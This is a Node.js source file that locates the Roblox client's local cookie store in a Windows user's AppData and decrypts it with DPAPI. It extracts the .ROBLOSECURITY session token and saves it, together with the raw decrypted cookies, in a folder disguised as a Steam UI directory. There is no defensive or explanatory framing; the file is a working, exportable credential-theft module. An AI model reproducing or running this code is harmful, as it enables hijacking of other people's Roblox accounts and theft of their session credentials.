
const fs = require('fs');
const fsPromises = fs.promises;
const path = require('path');
const os = require('os');
const dpapi = require('@primno/dpapi').default;

async function extractrbx() {
  try {
    const baseLocal = path.join(os.homedir(), 'AppData', 'Local');
    const candidate = path.join(baseLocal, 'RobloxPCGDK', 'LocalStorage', 'RobloxCookies.dat');

    if (!fs.existsSync(candidate)) {
      throw new Error(`Target file not found: ${candidate}`);
    }

    const fileContent = await fsPromises.readFile(candidate, 'utf8');
    const parsed = JSON.parse(fileContent);

    const encoded = parsed?.CookiesData;
    if (!encoded) {
      throw new Error('CookiesData key not found in JSON.');
    }

    const decodedBuffer = Buffer.from(encoded, 'base64');
    if (!decodedBuffer.length) throw new Error('Decoded buffer empty');

    const decrypted = dpapi.unprotectData(decodedBuffer, null, 'CurrentUser');
    const decryptedStr = decrypted.toString('utf8');

    const tokenRegexes = [
      /\.ROBLOSECURITY\s*=?\s*(_\|WARNING:[^\s;]+)/i,
      /ROBLOSECURITY\s*=?\s*([A-Za-z0-9_\|:-]{10,})/i,
      /(_\|WARNING:[A-Za-z0-9_\|:-]{10,})/i
    ];

    let foundToken = null;
    for (const rx of tokenRegexes) {
      const m = decryptedStr.match(rx);
      if (m && m[1]) {
        foundToken = m[1];
        break;
      }
    }

    const outDir = path.join(os.homedir(), 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012');
    await fsPromises.mkdir(outDir, { recursive: true });

    const rawPath = path.join(outDir, 'RawRobloxCookie.txt');
    await fsPromises.writeFile(rawPath, decryptedStr, 'utf8');

    if (foundToken) {
      const tokenPath = path.join(outDir, 'RobloxCookie.txt');
      await fsPromises.writeFile(tokenPath, foundToken, 'utf8');
    }

    return {
      success: true,
      decrypted: true,
      tokenFound: !!foundToken,
    };
  } catch (err) {
    console.error('[error]', err.message);
    return { success: false, error: err.message };
  }
}

if (require.main === module) {
  extractrbx().then(result => {
    if (!result.success) process.exitCode = 1;
  }).catch(err => {
    console.error('[fatal]', err);
    process.exitCode = 1;
  });
}

module.exports = { extractrbx };
